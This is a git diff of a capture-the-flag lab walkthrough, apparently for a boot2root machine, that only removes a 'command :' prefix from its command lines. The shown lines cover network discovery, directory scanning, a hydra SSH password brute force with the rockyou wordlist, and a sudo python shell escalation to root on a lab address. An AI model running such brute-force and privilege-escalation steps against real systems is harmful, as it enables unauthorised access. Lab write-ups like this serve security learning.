@@ -14,7 +14,7 @@ first step is to get the IP of the machine , so we can run netdiscover or nmap.
 here I ran netdicover.
 
 ![alt text](https://i.imgur.com/AK3QbZL.png)
-`command : netdiscover -r 192.168.1.0/24`
+`netdiscover -r 192.168.1.0/24`
 
 know we know our target IP is 192.168.53.130
 
@@ -42,7 +42,7 @@ here's dirb result .
 
 ![alt text](https://i.imgur.com/18kPvHg.png)
 
-`command : dirb http://192.168.53.130`
+`dirb http://192.168.53.130`
 
 
 and there's something interesting in dirb and burpsuite result , we have a wordpress running!
@@ -57,7 +57,7 @@ I will use rockyou wordlist .
 
 ![alt text](https://i.imgur.com/6TCVKN5.png)
 
-`command : hydra -l michael -P rockyou.txt ssh://192.168.53.130`
+`hydra -l michael -P rockyou.txt ssh://192.168.53.130`
 
 now let's login via ssh .
 ![alt text](https://i.imgur.com/xeoa8xv.png)
@@ -103,13 +103,13 @@ here I need to know which command steven can run in sudo .
 
 ![alt text](https://i.imgur.com/oQFTNyK.png)
 
-`command : sudo -l`
+`sudo -l`
 
 ok! we can use python.
 
 ![alt text](https://i.imgur.com/fPM2Eeu.png)
 
-`command :  sudo /usr/bin/python -c "import pty;pty.spawn('/bin/bash');"`
+`sudo /usr/bin/python -c "import pty;pty.spawn('/bin/bash');"`
 
 now we are root, and we got the fourth flag !
 
